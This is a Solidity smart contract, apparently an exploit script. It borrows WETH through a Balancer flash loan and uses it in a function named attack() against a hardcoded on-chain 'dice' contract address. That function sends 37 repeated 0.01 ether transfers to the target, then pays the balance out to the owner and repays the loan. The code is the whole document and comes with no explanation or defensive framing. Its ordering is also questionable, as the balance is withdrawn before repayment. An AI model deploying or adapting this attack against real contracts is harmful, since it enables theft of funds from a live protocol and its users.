// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "IFlashLoanRecipient.sol";
import "IBalancerVault.sol";
import "hardhat/console.sol";

interface WETH {
    function balanceOf(address account) external returns (uint256);
    function approve (address spender , uint256 value) external;
    function deposit() external payable;
    function withdraw(uint wad) external;
}


contract BalancerFlashLoan is IFlashLoanRecipient {
    using SafeMath for uint256;

    address private owner;
    address public immutable vaultContractAddress = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public diceContractAddress = 0x33A8eA1c8C6294C9F65f3DAd7CA7f037BD09F951;
    address public wethContractAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    function unwrap() public {
        WETH weth = WETH(wethContractAddress);

        weth.withdraw(weth.balanceOf(address(this)));
    }

    function attack() public {
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
        payable(diceContractAddress).transfer(0.01 ether);
    }

    function wrap() public {
        WETH weth = WETH(wethContractAddress);

        weth.deposit{value: 0.37 ether}();
    }

    function withdrawattack() public {
        payable(owner).transfer(address(this).balance);
    }


    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        for (uint256 i = 0; i < tokens.length; ++i) {
            IERC20 token = tokens[i];
            uint256 amount = amounts[i];
            console.log("borrowed amount:", amount);
            uint256 feeAmount = feeAmounts[i];
            console.log("flashloan fee: ", feeAmount);

            unwrap();
            attack();
            wrap();
            withdrawattack();

            // eturn loan
            token.transfer(vaultContractAddress, amount);
        }
    }

    function flashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external {
        IBalancerVault(vaultContractAddress).flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            userData
        );
    }

    function withdrawTokens(IERC20[] memory tokens, uint256[] memory amounts) external onlyOwner {
        require(tokens.length == amounts.length, "Token and amount arrays must have the same length");

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 balance = tokens[i].balanceOf(address(this));
            require(balance >= amounts[i], "Insufficient token balance");

            tokens[i].transfer(msg.sender, amounts[i]);
        }
    }

    function withdrawEther(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient Ether balance");
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {
        // Esta función permite que el contrato reciba Ether cuando se le envía directamente.
    }
}
